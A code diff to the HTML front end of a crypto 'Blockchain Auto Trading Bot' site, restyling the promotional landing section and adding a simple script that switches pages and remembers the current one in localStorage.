@@ -70,39 +70,32 @@
 </head>      
 <body>      
   
-  <main>
-  <!-- PAGE 1: Welcome to Blockchain Auto Trading Bot -->
-  <section id="page1" class="min-h-screen bg-[#0e0f1a] text-white px-6 py-16 flex flex-col items-center justify-center text-center">
-    <h1 class="text-4xl sm:text-5xl font-bold mb-6 text-blue-400">Blockchain Auto Trading Bot</h1>
-
-    <p class="max-w-2xl text-lg sm:text-xl text-gray-300 mb-6">
-      <strong class="text-white">24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br /><br />
-      Take your trading to the next level with our AI-driven auto bot — executing strategies based on smart contract logic, real-time signals, and secure on-chain activity.
+  <!-- Landing Page -->
+  <section id="page1">
+    <h1 style="font-size: 2.2rem; font-weight: bold; color: #f0b90b; margin-bottom: 1rem;">
+      Welcome to Blockchain Auto Trading Bot
+    </h1>
+    <p style="max-width: 750px; font-size: 1rem; line-height: 1.8; margin-bottom: 2rem;">
+      <strong>24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br /><br />
+      Take your crypto trading to the next level with our cutting-edge Blockchain Auto Trading Bot — a fully automated system that leverages advanced algorithms, real-time market data, and smart contract technology to trade your assets efficiently and securely.
     </p>
-
-    <ul class="text-left text-sm sm:text-base space-y-2 text-gray-300 mb-6 max-w-md mx-auto">
-      <li>✔️ AI-Powered Strategy Execution</li>
-      <li>✔️ Integrated with Binance, Ethereum, BSC & More</li>
-      <li>✔️ Auto-Buy/Sell at Optimal Market Conditions</li>
-      <li>✔️ Secure, Transparent, and On-Chain Verified</li>
-      <li>✔️ Real-Time Profit Dashboard & Alerts</li>
+    <ul style="text-align: left; max-width: 500px; margin: 0 auto 2rem; font-size: 1rem; list-style: none; padding-left: 0;">
+      <li style="margin-bottom: 0.5rem;">✅ AI-Powered Strategy Execution</li>
+      <li style="margin-bottom: 0.5rem;">✅ Integrated with Binance, Ethereum, BSC & More</li>
+      <li style="margin-bottom: 0.5rem;">✅ Auto-Buy/Sell at Optimal Market Conditions</li>
+      <li style="margin-bottom: 0.5rem;">✅ Secure, Transparent, and On-Chain Verified</li>
+      <li>✅ Real-Time Profit Dashboard & Alerts</li>
     </ul>
-
-    <p class="text-gray-400 max-w-xl text-base sm:text-lg mb-10">
-      <strong class="text-white">You stay in control.</strong><br />
-      Customize trading goals, stop-loss levels, and pairs. Let the bot work while you monitor performance from a sleek dashboard.
+    <p style="max-width: 700px; font-size: 1rem; margin-bottom: 2.5rem;">
+      <strong>You stay in control.</strong><br />
+      Set your trading goals, stop-loss limits, and preferred pairs. Let the bot do the rest while you monitor your profits from an intuitive dashboard.
     </p>
-
-    <div class="flex flex-wrap justify-center gap-4">
-      <button id="btnGotoSignup" onclick="showPage('1i')" class="px-6 py-2 bg-blue-500 hover:bg-blue-600 rounded-lg text-white font-semibold shadow-md transition">
-        Sign Up
-      </button>
-      <button id="btnGotoLogin" onclick="showPage('1iii')" class="px-6 py-2 bg-gray-700 hover:bg-gray-800 rounded-lg text-white font-semibold shadow-md transition">
-        Login
-      </button>
+    <div>
+      <button class="btn-yellow" onclick="showPage('1i')">Sign Up</button>
+      <button class="btn-outline" onclick="showPage('1iii')">Login</button>
     </div>
-  </section>
-  </main>
+  </section> 
+  
     
     <!-- PAGE 1i: Sign Up -->
 
@@ -203,7 +196,8 @@
   </div>      
 </div>    
     
-    <!-- Page 3i: Trading Strategy -->      <div id="page3i" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
+    <!-- Page 3i: Trading Strategy -->     
+  <div id="page3i" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
   <h2>🧠 Trading Strategy</h2>      
   <p>Select your preferred trading strategy:</p>      
   <select id="strategySelect" style="width:100%; padding:10px; margin-bottom:20px;">      
@@ -520,5 +514,20 @@ document.querySelectorAll(".network-copy").forEach(btn => {
     setTimeout(() => btn.innerText = "Copy", 1000);      
   });      
 });      
-</script>      </body>      
-                                                  </html>
+</script>  
+ <script>
+   function showPage(id) {
+      const sections = document.querySelectorAll("section");
+      sections.forEach(section => section.style.display = "none");
+      document.getElementById("page" + id).style.display = "flex";
+      localStorage.setItem("currentPage", id);
+    }
+
+    // Stay on current page after refresh
+    window.onload = () => {
+      const savedPage = localStorage.getItem("currentPage") || "1";
+      showPage(savedPage);
+    }
+    </script>
+  </body>      
+ </html>
